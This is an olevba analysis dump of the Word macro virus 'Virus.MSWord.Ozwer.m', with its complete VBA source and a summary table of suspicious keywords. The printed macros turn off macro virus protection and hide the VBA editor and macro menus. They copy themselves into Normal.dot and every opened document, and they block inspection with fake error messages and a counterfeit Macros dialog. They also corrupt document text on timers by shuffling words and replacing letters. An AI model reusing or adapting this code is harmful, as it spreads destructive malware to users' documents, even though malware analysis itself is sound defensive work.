olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO courier.bas 
in file: Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276 - OLE stream: 'Macros/VBA/courier'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Public Sub AutoExec()
On Error Resume Next
   CommandBars("Visual Basic").Visible = False
   CommandBars("Control Toolbox").Visible = False
       With CommandBars("tools")
.Controls(12).Enabled = False 'macro
.Controls(13).Enabled = False 'modelos e suplemento....
.Controls(14).Enabled = False  'personalizar...
.Controls(15).Enabled = True  'opções...
End With
CommandBars("view").Controls(6).Enabled = False 'barras de ferramentas
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
End Sub
Sub AutoOpen()
On Error Resume Next
AutoExec
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    Options.VirusProtection = False
inf
timer
End Sub
Sub inf()
On Error Resume Next
Options.SaveNormalPrompt = False
    If Nch = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="courier", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="cor", Object:=wdOrganizerObjectProjectItems
        Application.Caption = "° Microsoft Word"
    End If
    If Dch = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="courier", Object:=wdOrganizerObjectProjectItems
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="cor", Object:=wdOrganizerObjectProjectItems
    End If
End Sub
Function Nch()
Dim i As Integer
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "courier" Then Nch = True
    Next
End Function
Function Dch()
Dim j As Integer
    For j = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(j).Name = "courier" Then Dch = True
    Next
End Function
Public Sub c()
Options.SaveNormalPrompt = False
inf
End Sub
Sub FormatFont()
inf
Dialogs(wdDialogFormatFont).Show
End Sub
Sub FilePrint()
inf
Dialogs(wdDialogFilePrint).Show
End Sub
Sub FileSaveas()
c
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileSave()
c
ActiveDocument.Save
End Sub

Sub filenew()
Word.Documents.Add
inf
timer
End Sub
Sub EditCopy()
inf
Selection.Copy
End Sub
Sub editpaste()
inf

Selection.Paste
End Sub
Sub ToolsMacro()
On Error Resume Next
cor.Show
End Sub
Sub FileExit()
c
Application.Quit
MsgBox ("oK")
End Sub
Sub ViewVBCode()
On Error Resume Next
Dim letr As String
letr = CommandBars("tools").Controls(16).Caption
Select Case letr
Case "Opcio&nes..."
MsgBox "Error interno no Word Basic Err=1100e." + vbCr + "Impossível carregar bibliotecas dinámicas." + vbCr + vbCr + "Certifique-se que todos os arquivos estão" + vbCr + "em suas pastas." + vbCr + vbCr + "Se o problema persistir, consulte a guia" + vbCr + "do usuário.", vbCritical
Case "&Options..."
MsgBox "Word Basic internal error Err=1100e." + vbCr + "Unable to load module 1x6004." + vbCr + vbCr + "Check that all files are in their folders" + vbCr + "and that they are not damaged." + vbCr + vbCr + "If the problem persists, consult user´s guide.", vbCritical
End Select
End Sub
Sub ToolsOptions()
Dim Y As Byte
Randomize
Y = Int((7 * Rnd) + 1)
Select Case Y
    Case 1
        Dialogs(wdDialogToolsOptionsTabView).Show
    Case 2
        Dialogs(wdDialogToolsOptionsSpellingAndGrammar).Show
    Case 3
        Dialogs(wdDialogToolsOptionsTabPrint).Show
    Case 4
        Dialogs(wdDialogToolsOptionsTabEdit).Show
    Case 6
         Dialogs(wdDialogToolsOptionsTabTrackChanges).Show
    Case 5
         Dialogs(wdDialogToolsOptionsTabUserInfo).Show
    Case 7
         Dialogs(wdDialogToolsOptionsCompatibility).Show
    End Select
End Sub
Sub cor2()Rem Nem tudo é perfeito, se fosse voçê não me acharia Ass: Courier!!!!!
Dim indi, nu, nu2, limite, x As Integer
x = Int((4 * Rnd) + 1)
On Error GoTo bye
limite = ActiveDocument.Words.Count
If limite = (limite > 350 And limite < 400) Or (limite > 700 And limite < 750) Or (limite > 900 And limite < 950) Or (limite > 1000 And limite < 1050) Or (limite > 1150 And limite < 1200) Or (limite > 1300 And limite < 1350) Or (limite > 1500 And limite < 1600) And x = 3 Then
    Selection.HomeKey Unit:=wdStory
    For indi = 1 To limite
        Randomize
        nu2 = Int((5 * Rnd) + 2)
        nu = Int((4 * Rnd) + 1)
        indi = indi + nu2
            ActiveDocument.Words(indi).Select
        WordBasic.MoveText
            If nu = 1 Then
                        Selection.MoveRight Unit:=wdWord, Count:=nu2
            Else
                        Selection.MoveLeft Unit:=wdWord, Count:=nu2
            End If
        WordBasic.OK
Next indi
End If
timer
bye:
End Sub
Sub infect()
       With CommandBars("file")
.Controls(4).Enabled = False
.Controls(5).Enabled = False
.Controls(6).Enabled = False
End With
    Selection.MoveUp Unit:=wdLine, Count:=73
    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = "A"
        .Replacement.Text = "Courier"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = True
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute
    Selection.Find.Execute Replace:=wdReplaceAll
    With Selection.Find
        .Text = "0"
        .Replacement.Text = "10"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = True
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute
    Selection.Find.Execute Replace:=wdReplaceAll
    With Selection.Find
        .Text = "o"
        .Replacement.Text = "8"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = True
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute
    Selection.Find.Execute Replace:=wdReplaceAll
    With Selection.Find
        .Text = "e"
        .Replacement.Text = "d"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = True
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
    With Selection.Find
        .Text = "b"
        .Replacement.Text = "c"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = True
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
    Selection.Find.Execute
    With Selection.Find
        .Text = "de"
        .Replacement.Text = "COURIER"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = True
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute
    Selection.Find.Execute
End Sub
Sub timer()
Application.OnTime When:=Now + TimeValue("00:20:00"), Name:="cor2"
Application.OnTime When:=Now + TimeValue("00:35:35"), Name:="infect"
End Sub

-------------------------------------------------------------------------------
VBA MACRO cor.frm 
in file: Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276 - OLE stream: 'Macros/VBA/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







































































































Option Explicit
Private Sub CommandButton1_Click()
Beep
Beep
End Sub
Private Sub CommandButton2_Click()
On Error Resume Next
cor.Hide
End Sub
Private Sub CommandButton3_Click()
Beep
Beep
End Sub
Private Sub CommandButton4_Click()
Beep
Beep
End Sub
Private Sub CommandButton5_Click()
Beep
Beep
End Sub
Private Sub CommandButton6_Click()
Beep
Beep
End Sub
Private Sub CommandButton7_Click()
Beep
Beep
End Sub
Private Sub userform_initialize()
On Error Resume Next
Dim user, docn, PyD, Pg, Cw, Dc, Mc, Pr, letr As String
letr = CommandBars("tools").Controls(16).Caption
Select Case letr
Case "Opcio&nes..."
        PyD = "Todos os Modelos e documentos ativos"
        Pg = "Normal.dot (plantilla global)"
        Cw = "Comandos do Word"
        Dc = " (documento)"
        Mc = "Macros criadas em "
        Pr = " por "
        CommandButton1.Caption = "Executar"
        CommandButton1.ControlTipText = "Executa uma macro selecionada (não há macros disponíveis)"
        CommandButton2.Caption = "Cancelar"
        CommandButton2.ControlTipText = "Cancelar seleção"
        CommandButton3.Caption = "Passo a passo"
        CommandButton3.ControlTipText = "Executa macro instrução por instrução"
        CommandButton4.Caption = "Modificar"
        CommandButton4.ControlTipText = "Modificar macro selecionada (não há macros disponíveis)"
        CommandButton5.Caption = "Criar"
        CommandButton5.ControlTipText = "Criar uma macro nova (não disponivel)"
        CommandButton7.Caption = "Excluir"
        CommandButton7.ControlTipText = "Excluir macro selecionada (não há macros disponíveis)"
        CommandButton6.Caption = "Organizador..."
        Label3.Caption = "Nome do macro:"
        Label1.Caption = "Macros em:"
        Label2.Caption = "Descrição:"
        
        
Case "&Options..."
        PyD = "All templates and active documents"
        Pg = "Normal.dot (global template)"
        Cw = "Word commands"
        Dc = " (document)"
        Mc = "Macros made on "
        Pr = " by "
        CommandButton1.Caption = "Run"
        CommandButton1.ControlTipText = "Run selected macro (no macros available)"
        CommandButton2.Caption = "Cancel"
        CommandButton2.ControlTipText = "Cancel selection"
        CommandButton3.Caption = "Step by step"
        CommandButton3.ControlTipText = "Run macro step by step"
        CommandButton4.Caption = "Modify"
        CommandButton4.ControlTipText = "Modify selected macro seleccionada (no macros available)"
        CommandButton5.Caption = "New"
        CommandButton5.ControlTipText = "Create a new macro (not available)"
        CommandButton7.Caption = "Delete"
        CommandButton7.ControlTipText = "Delete selected macro (no macro selected)"
        CommandButton6.Caption = "Organizer..."
        Label3.Caption = "Macro name:"
        Label1.Caption = "Macros in:"
        Label2.Caption = "Description:"
End Select
docn = ActiveDocument.Name
user = Application.UserName
ComboBox1.Text = PyD
ComboBox1.AddItem (PyD), 0
ComboBox1.AddItem (Pg), 1
ComboBox1.AddItem (Cw), 2
ComboBox1.AddItem (docn & Dc), 3
ComboBox1.AddItem (""), 4
ComboBox1.AddItem (""), 5
TextBox1.Text = Mc & Date & Pr & user

End Sub
Rem Courier é 10
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Editar@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Executar�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Cancelar�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Criar
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Passo a Passo|F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Biblioteca...|F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Excluir
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.Ozwer.m-cdd1c3787fa54fdd1395b1ea9022c3c50104c276' - OLE stream: 'Macros/cor'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |~)^                 |file                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

